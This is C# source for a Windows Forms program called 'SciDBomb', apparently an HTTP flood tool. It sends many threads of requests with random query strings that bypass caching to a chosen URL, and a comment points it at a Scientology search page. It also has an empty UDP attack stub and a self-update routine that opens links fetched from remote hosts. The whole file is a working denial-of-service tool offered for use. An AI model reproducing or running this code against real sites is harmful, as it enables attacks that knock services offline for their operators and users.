using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace SciDBomb
{
    public partial class frmMain : Form
    {
        public frmMain()
        {
            InitializeComponent();
        }

        WebReq[] Clients = new WebReq[13];
        bool bintDownload = false, bintDisplay = false, bChars = false;
        int iCCount = 0, iDownloaded = 0, iRequested = 0, iFailed = 0, iTimeout = 0;
        string TargetURL = "";
        long[] StartTick;

        public static string AppDomain = "http://tox.awardspace.us/div/";
        public static string ToxDomain = "http://www.praetox.com/";

        private static long Tick()
        {
            return System.DateTime.Now.Ticks / 10000000;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            //http://www.scientology.org/html/en_US/feature/search/index.html?query=<RANDOMSTRINGHERE>+&index=cos%2Ccos_rtc&go.x=16&go.y=13
            if (!System.IO.Directory.Exists("tmp")) System.IO.Directory.CreateDirectory("tmp");
            this.Text += Application.ProductVersion;

            try
            {
                string lol = new System.Net.WebClient().DownloadString(
                    AppDomain + "SciDBomb_version.php?cv=" + Application.ProductVersion);
                if (!lol.Contains("<VERSION>" + Application.ProductVersion + "</VERSION>"))
                {
                    bool GetUpdate = (DialogResult.Yes == MessageBox.Show(
                        "There's a new version of SciDBomb available. Update?",
                        "so i herd u liek mudkipz", MessageBoxButtons.YesNo));
                    if (GetUpdate)
                    {
                        string UpdateLink = new System.Net.WebClient().DownloadString(
                            ToxDomain + "inf/SciDBomb_link.html").Split('%')[1];
                        System.Diagnostics.Process.Start(UpdateLink + "?cv=" + Application.ProductVersion);
                        Application.Exit();
                    }
                }
            }
            catch
            {
                MessageBox.Show("Couldn't check for updates.\r\n\r\nAlso, cocks.", "A cat is fine too");
            }
        }

        private void tThreadState_Tick(object sender, EventArgs e)
        {
            if (bintDownload) return; if (bintDisplay) return; bintDisplay = true;
            long cTick = Tick();
            int iThreads = 0;
            int iIdle = 0;
            int iConnecting = 0;
            int iRequesting = 0;
            int iDownloading = 0;
            for (int a = 0; a <= Clients.GetUpperBound(0); a++)
            {
                iThreads++;
                if (Clients[a].State == WebReq.ReqState.Ready ||
                    Clients[a].State == WebReq.ReqState.Completed)
                    iIdle++;
                if (Clients[a].State == WebReq.ReqState.Connecting)
                    iConnecting++;
                if (Clients[a].State == WebReq.ReqState.Requesting)
                    iRequesting++;
                if (Clients[a].State == WebReq.ReqState.Downloading)
                    iDownloading++;

                if (Clients[a].State == WebReq.ReqState.Failed ||
                    cTick > StartTick[a] + iTimeout)
                {
                    iDownloaded--;
                    if (Clients[a].State == WebReq.ReqState.Downloading) iRequested++;
                    if (Clients[a].State != WebReq.ReqState.Downloading) iFailed++;
                    //Clients[a] = null;
                    //Application.DoEvents();
                    Clients[a] = new WebReq();
                    //Clients[a].SetTimeout(iTimeout);
                    //Application.DoEvents();
                    //MessageBox.Show(
                    //    Clients[a].isReady + "\r\n" +
                    //    Clients[a].State);
                }
            }
            lbTotalThreads.Text = "" + iThreads;
            lbIdle.Text = "" + iIdle;
            lbConnecting.Text = "" + iConnecting;
            lbRequesting.Text = "" + iRequesting;
            lbDownloading.Text = "" + iDownloading;
            lbDownloaded.Text = "" + iDownloaded;
            lbRequested.Text = "" + iRequested;
            lbFailed.Text = "" + iFailed;
            bintDisplay = false;
        }

        private void tDownload_Tick(object sender, EventArgs e)
        {
            if (bintDownload) return; if (bintDisplay) return; bintDownload = true;
            for (int a = 0; a <= Clients.GetUpperBound(0); a++)
            {
                if (Clients[a].isReady)
                {
                    iDownloaded++; StartTick[a] = Tick();
                    string NewRand = GenRand();
                    string ReqURL = TargetURL.Replace("#rand#", NewRand);
                    Clients[a].Request(
                        ReqURL,
                        new System.Net.WebHeaderCollection(),
                        "",
                        "tmp/" + NewRand + ".html",
                        false);
                    //this.Text = System.DateTime.Now.Ticks + "";
                }
            }
            bintDownload = false;
        }

        private string GenRand()
        {
            Random rnd = new Random();
            string sRnd = "";
            for (int a = 0; a < iCCount; a++)
            {
                int tmp = 0;
                if (bChars) tmp = rnd.Next(97, 123);
                if (!bChars) tmp = rnd.Next(48, 58);
                sRnd += "" + (char)tmp;
            }
            return sRnd;
        }

        private void cmdStart_Click(object sender, EventArgs e)
        {
            cmdStart.Enabled = false;
            cmdStart.Text = "B O M B I N G . . .";
            TargetURL = txtURL.Text;
            iTimeout = Convert.ToInt32(txtTimeout.Text);
            bChars = radChars.Checked;
            iCCount = Convert.ToInt32(txtCharCount.Text);
            Clients = new WebReq[Convert.ToInt32(txtThreads.Text)];
            for (int a = 0; a < Clients.Length; a++)
            {
                Clients[a] = new WebReq();
                //Clients[a].SetTimeout(iTimeout);
            }
            iDownloaded = -(Clients.Length);
            StartTick = new long[Clients.Length];
            tThreadState.Start(); tDownload.Start();
        }

        private void tCleanup_Tick(object sender, EventArgs e)
        {
            try
            {
                long tTick = Tick();
                string[] Filelist = System.IO.Directory.GetFiles("tmp/");
                foreach (string file in Filelist)
                {
                    if (((
                        (new System.IO.FileInfo(file).LastWriteTime.Ticks)
                        / 10000000) + iTimeout + 15) < tTick)
                    {
                        System.IO.File.Delete(file);
                    }
                }
            }
            catch { }
        }

        private void UDPAttack(string IP, int Port)
        {

        }

        private void GetIP_Go_Click(object sender, EventArgs e)
        {
            GetIP_IP.Text = "" + System.Net.Dns.GetHostEntry(new Uri(GetIP_URL.Text).Host).AddressList[0];
        }
    }
}
